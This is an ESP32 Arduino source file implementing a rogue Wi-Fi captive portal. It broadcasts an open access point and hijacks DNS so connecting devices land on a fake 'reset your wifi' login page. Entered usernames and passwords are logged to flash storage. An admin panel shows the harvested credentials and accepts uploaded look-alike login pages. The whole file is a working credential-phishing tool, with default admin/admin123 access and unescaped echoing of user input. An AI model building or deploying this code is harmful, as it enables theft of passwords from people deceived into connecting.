#include <WiFi.h>
#include <DNSServer.h>
#include <WebServer.h>
#include <LittleFS.h>

// Configuration Paths
const char* CONFIG_FILE_PATH = "/config.txt";
const char* LOG_FILE_PATH = "/guests.txt";
const char* VISIT_FILE_PATH = "/visits.txt";
const byte DNS_PORT = 53;

// Default System Fallbacks
String apSSID = "Your_WiFi_Setup";
String apIPStr = "4.3.2.1";
String adminUser = "admin";
String adminPass = "admin123";
String activeHtmlFile = "default"; // "default" or filename like "login.html"

IPAddress apIP;
DNSServer dnsServer;
WebServer server(80);

int visitCount = 0;
bool shouldReboot = false;
unsigned long rebootMillis = 0;
File fsUploadFile; 

// Load all system configs from LittleFS
void loadSystemConfig() {
  if (LittleFS.exists(CONFIG_FILE_PATH)) {
    File file = LittleFS.open(CONFIG_FILE_PATH, FILE_READ);
    if (file) {
      apSSID = file.readStringUntil('\n');    apSSID.trim();
      apIPStr = file.readStringUntil('\n');   apIPStr.trim();
      adminUser = file.readStringUntil('\n'); adminUser.trim();
      adminPass = file.readStringUntil('\n'); adminPass.trim();
      activeHtmlFile = file.readStringUntil('\n'); activeHtmlFile.trim();
      if(activeHtmlFile.length() == 0) activeHtmlFile = "default";
      file.close();
    }
  } else {
    saveSystemConfig();
  }
  apIP.fromString(apIPStr);
}

// Save system variables back to disk
void saveSystemConfig() {
  File file = LittleFS.open(CONFIG_FILE_PATH, FILE_WRITE);
  if (file) {
    file.println(apSSID); file.println(apIPStr);
    file.println(adminUser); file.println(adminPass);
    file.println(activeHtmlFile);
    file.close();
  }
}

void loadVisitCount() {
  if (LittleFS.exists(VISIT_FILE_PATH)) {
    File file = LittleFS.open(VISIT_FILE_PATH, FILE_READ);
    if (file) { visitCount = file.readString().toInt(); file.close(); }
  }
}

void saveVisitCount() {
  File file = LittleFS.open(VISIT_FILE_PATH, FILE_WRITE);
  if (file) { file.print(visitCount); file.close(); }
}

String getPage(String title, String content, bool isAdminPage = false) {
  String p = "<!DOCTYPE html><html><head><meta name='viewport' content='width=device-width,initial-scale=1'>";
  p += "<style>body{font-family:sans-serif;background:#f0f2f5;padding:20px;color:#333;}";
  p += ".card{background:white;padding:25px;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,0.1);max-width:500px;margin:0 auto;}";
  p += "h2,h3{color:#1a73e8;margin-top:0;}input,textarea,select{width:100%;padding:10px;margin:8px 0;box-sizing:border-box;border:1px solid #ccc;border-radius:4px;}";
  p += "button{width:100%;background:#1a73e8;color:white;padding:12px;border:none;border-radius:4px;font-size:16px;cursor:pointer;}";
  p += "button:hover{background:#1557b0;}.log-area{font-family:monospace;height:200px;}";
  p += ".box{background:#f8f9fa;padding:15px;border:1px dashed #ccc;border-radius:4px;margin:15px 0;}";
  p += ".tabs{display:flex;margin-bottom:20px;border-bottom:2px solid #ddd;}";
  p += ".tab-btn{background:none;color:#555;padding:10px 15px;border:none;font-size:14px;cursor:pointer;width:auto;border-bottom:2px solid transparent;margin-bottom:-2px;}";
  p += ".tab-btn.active{color:#1a73e8;border-bottom:2px solid #1a73e8;font-weight:bold;}.tab-btn:hover{background:#eee;}";
  p += ".tab-content{display:none;}.tab-content.active{display:block;}.net-info{font-size:13px;background:#e8f0fe;padding:10px;border-radius:4px;margin-bottom:15px;}";
  p += ".btn-danger{background:#d93025;} .btn-danger:hover{background:#b31412;} .flex-container{display:flex; gap:10px; margin-top:8px;}</style>";
  
  if (isAdminPage) {
    p += "<script>function openTab(evt,tabName){var i,tc,tb;tc=document.getElementsByClassName('tab-content');for(i=0;i<tc.length;i++){tc[i].className=tc[i].className.replace(' active','');}";
    p += "tb=document.getElementsByClassName('tab-btn');for(i=0;i<tb.length;i++){tb[i].className=tb[i].className.replace(' active','');}";
    p += "document.getElementById(tabName).className+=' active';evt.currentTarget.className+=' active';localStorage.setItem('activeTab',tabName);}";
    p += "window.onload=function(){var at=localStorage.getItem('activeTab')||'tab1';document.getElementById(at).className+=' active';";
    p += "var btns=document.getElementsByClassName('tab-btn');for(var i=0;i<btns.length;i++){if(btns[i].getAttribute('onclick').includes(at)){btns[i].className+=' active';}}};</script>";
  }
  
  p += "<title>" + title + "</title></head><body><div class='card'>" + content + "</div></body></html>";
  return p;
}

bool isCaptivePortalRedirect() {
  String host = server.hostHeader();
  if (!host.equals(WiFi.softAPIP().toString()) && !host.equals(server.client().localIP().toString())) {
    server.sendHeader("Location", String("http://") + WiFi.softAPIP().toString(), true);
    server.send(302, "text/plain", "");
    return true;
  }
  return false;
}

void handleGuestPage() {
  if (isCaptivePortalRedirect()) return;
  visitCount++;
  saveVisitCount();

  // If a custom HTML file is chosen and exists, serve it
  if (activeHtmlFile != "default" && LittleFS.exists("/" + activeHtmlFile)) {
    File file = LittleFS.open("/" + activeHtmlFile, FILE_READ);
    server.streamFile(file, "text/html");
    file.close();
    return;
  }

  // Built-in fallback template
  String content = "<h2>Your Wifi Credentials</h2>";
  content += "<p>Please log in to reset your wifi.</p>";
  content += "<form action='/submit' method='POST'>";
  content += "Username:<input type='text' name='name' required placeholder='Username'><br>";
  content += "Password:<input type='text' name='email' required placeholder='Password'><br><br>";
  content += "<button type='submit'>Connect</button>";
  content += "</form>";
  server.send(200, "text/html", getPage("Login To Your WiFi", content));
}

void handleFormSubmit() {
  String name = server.arg("name");
  String email = server.arg("email");
  String logEntry = "Username: " + name + " | Password: " + email + "\n";

  File file = LittleFS.open(LOG_FILE_PATH, FILE_APPEND);
  if (file) { file.print(logEntry); file.close(); }

  String content = "<h2>Login Complete</h2><p>Thank you, <b>" + name + "</b>. Connection parameters deployed safely.</p>";
  server.send(200, "text/html", getPage("Success", content));
}

void handleAdminPage() {
  if (!server.authenticate(adminUser.c_str(), adminPass.c_str())) {
    return server.requestAuthentication();
  }

  String logs = "";
  File file = LittleFS.open(LOG_FILE_PATH, FILE_READ);
  if (file) {
    while (file.available()) { logs += (char)file.read(); }
    file.close();
  }

  // Build Tab Header Navigation Links
  String content = "<h2>Admin Panel</h2>";
  content += "<div class='tabs'>";
  content += "<button class='tab-btn' onclick=\"openTab(event,'tab1')\">Logs</button>";
  content += "<button class='tab-btn' onclick=\"openTab(event,'tab2')\">Settings</button>";
  content += "<button class='tab-btn' onclick=\"openTab(event,'tab3')\">Access</button>";
  content += "</div>";

  // --- TAB 1: LOGS & HTML MANAGEMENT ---
  content += "<div id='tab1' class='tab-content'>";
  content += "<p><b>Total Traffic Counter: " + String(visitCount) + " hits</b></p>";
  
  // HTML Template Selection Box
  content += "<div class='box'><h3>Select Active Portal HTML</h3>";
  content += "<form method='POST' action='/admin/setactive'>";
  content += "<select name='activefile'>";
  content += "<option value='default'" + String(activeHtmlFile == "default" ? " selected" : "") + ">Built-In System Default</option>";
  
  // Scan storage folder directory dynamically for uploaded .html files
  File root = LittleFS.open("/");
  File f = root.openNextFile();
  while(f){
    String fname = String(f.name());
    if(fname.endsWith(".html")) {
      String selected = (activeHtmlFile == fname) ? " selected" : "";
      content += "<option value='" + fname + "'" + selected + ">" + fname + "</option>";
    }
    f = root.openNextFile();
  }
  content += "</select><br><br>";
  content += "<button type='submit'>Activate Template</button></form>";

  // Danger Zone - File Delete Processing form
  if (activeHtmlFile != "default") {
    content += "<form method='POST' action='/admin/deletefile' style='margin-top:10px;'>";
    content += "<input type='hidden' name='filename' value='" + activeHtmlFile + "'>";
    content += "<button type='submit' class='btn-danger'>Delete Active Custom File</button></form>";
  }
  content += "</div>";

  // Upload Box Section
  content += "<div class='box'><h3>Upload New HTML Layout</h3>";
  content += "<form method='POST' action='/admin/upload' enctype='multipart/form-data'><input type='file' name='upload' accept='.html' required><br><br><button type='submit'>Upload File</button></form></div>";
  
  // Logs Output Form Box
  content += "<h3>Captured Registrations</h3><form action='/admin/save' method='POST'><textarea name='logdata' class='log-area'>" + logs + "</textarea><br><br><button type='submit'>Save Logs Changes</button></form></div>";

  // --- TAB 2: NETWORK CONFIGURATIONS ---
  content += "<div id='tab2' class='tab-content'>";
  content += "<h3>Network Settings</h3>";
  content += "<div class='net-info'><b>Current Status:</b><br>SSID: " + apSSID + "<br>IP Address: " + apIPStr + "<br>Clients Connected: " + String(WiFi.softAPgetStationNum()) + "</div>";
  content += "<form method='POST' action='/admin/netconfig'>";
  content += "Portal Wireless SSID:<input type='text' name='ssid' value='" + apSSID + "' required><br>";
  content += "Portal Base IP:<input type='text' name='ip' value='" + apIPStr + "' pattern='^(?:[0-9]{1,3}\\\\.){3}[0-9]{1,3}$' required><br><br>";
  content += "<button type='submit'>Apply & Reboot Network</button>";
  content += "</form></div>";

  // --- TAB 3: ACCOUNT ACCESS CONTROL ---
  content += "<div id='tab3' class='tab-content'>";
  content += "<h3>Update Credentials</h3>";
  content += "<form method='POST' action='/admin/security'>";
  content += "New Username:<input type='text' name='user' value='" + adminUser + "' required><br>";
  content += "New Password:<input type='password' name='pass' placeholder='Leave blank to keep current'><br><br>";
  content += "<button type='submit'>Save System Account</button>";
  content += "</form></div>";

  server.send(200, "text/html", getPage("Administration Console", content, true));
}

void handleSetActive() {
  if (!server.authenticate(adminUser.c_str(), adminPass.c_str())) return;
  activeHtmlFile = server.arg("activefile");
  saveSystemConfig();
  server.send(200, "text/html", getPage("Template Updated", "<h2>Active Page Set</h2><p>Portal layout shifted to: " + activeHtmlFile + "</p><br><button onclick=\"location.href='/admin'\">Return</button>"));
}

void handleDeleteFile() {
  if (!server.authenticate(adminUser.c_str(), adminPass.c_str())) return;
  String targetFile = server.arg("filename");
  if (targetFile != "default") {
    LittleFS.remove("/" + targetFile);
    activeHtmlFile = "default";
    saveSystemConfig();
  }
  server.send(200, "text/html", getPage("File System Sync", "<h2>File Erased</h2><p>Template destroyed safely.</p><br><button onclick=\"location.href='/admin'\">Return</button>"));
}

void handleNetConfig() {
  if (!server.authenticate(adminUser.c_str(), adminPass.c_str())) return;
  apSSID = server.arg("ssid"); apSSID.trim();
  apIPStr = server.arg("ip");  apIPStr.trim();
  saveSystemConfig();

  String content = "<h2>Network Profile Resetting</h2><p>Please connect manually to: <b>" + apSSID + "</b> and target <b>http://" + apIPStr + "/admin</b></p>";
  server.send(200, "text/html", getPage("Rebooting Layout...", content));
  shouldReboot = true; rebootMillis = millis();
}

void handleSecurityConfig() {
  if (!server.authenticate(adminUser.c_str(), adminPass.c_str())) return;
  adminUser = server.arg("user"); adminUser.trim();
  String newPass = server.arg("pass"); newPass.trim();
  if (newPass.length() > 0) { adminPass = newPass; }
  saveSystemConfig();

  server.send(200, "text/html", getPage("Account Sync Complete", "<h2>Credentials Updated</h2><p>Your adjustments have synced to memory.</p><br><button onclick=\"location.href='/admin'\">Return</button>"));
}

void handleFileUpload() {
  if (!server.authenticate(adminUser.c_str(), adminPass.c_str())) return;
  HTTPUpload& upload = server.upload();
  if (upload.status == UPLOAD_FILE_START) {
    String filename = upload.filename;
    if (!filename.startsWith("/")) filename = "/" + filename;
    fsUploadFile = LittleFS.open(filename, FILE_WRITE);
  } else if (upload.status == UPLOAD_FILE_WRITE && fsUploadFile) {
    fsUploadFile.write(upload.buf, upload.currentSize);
  } else if (upload.status == UPLOAD_FILE_END && fsUploadFile) {
    fsUploadFile.close();
  }
}

void handleAdminSave() {
  if (!server.authenticate(adminUser.c_str(), adminPass.c_str())) return;
  String updatedData = server.arg("logdata");
  File file = LittleFS.open(LOG_FILE_PATH, FILE_WRITE);
  if (file) {
    file.print(updatedData); file.close();
    server.send(200, "text/html", getPage("Admin Sync", "<h2>Changes Confirmed</h2><br><button onclick=\"location.href='/admin'\">Return</button>"));
  } else {
    server.send(500, "text/plain", "Sync error.");
  }
}

void handleNotFound() {
  if (isCaptivePortalRedirect()) return;
  server.send(404, "text/plain", "Endpoint not mapping.");
}

void setup() {
  Serial.begin(115200);
  delay(500);
  if (!LittleFS.begin(true)) { Serial.println("Storage Fault"); return; }
  
  loadSystemConfig();
  loadVisitCount();

  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP(apSSID.c_str());

  dnsServer.start(DNS_PORT, "*", apIP);

  server.on("/", HTTP_GET, handleGuestPage);
  server.on("/submit", HTTP_POST, handleFormSubmit);
  server.on("/admin", HTTP_GET, handleAdminPage);
  server.on("/admin/save", HTTP_POST, handleAdminSave);
  server.on("/admin/netconfig", HTTP_POST, handleNetConfig);
  server.on("/admin/security", HTTP_POST, handleSecurityConfig);
  server.on("/admin/setactive", HTTP_POST, handleSetActive);
  server.on("/admin/deletefile", HTTP_POST, handleDeleteFile);
  
  server.on("/admin/upload", HTTP_POST, []() {
    server.send(200, "text/html", getPage("File Updated", "<h2>HTML Template Sync Active</h2><br><button onclick=\"location.href='/admin'\">Return</button>"));
  }, handleFileUpload);
  
  server.on("/generate_204", HTTP_GET, handleGuestPage);       
  server.on("/fwlink", HTTP_GET, handleGuestPage);             
  server.on("/hotspot-detect.html", HTTP_GET, handleGuestPage); 
  
  server.onNotFound(handleNotFound);
  server.begin();
}

void loop() {
  dnsServer.processNextRequest();
  server.handleClient();
  if (shouldReboot && (millis() - rebootMillis >= 2000)) { ESP.restart(); }
}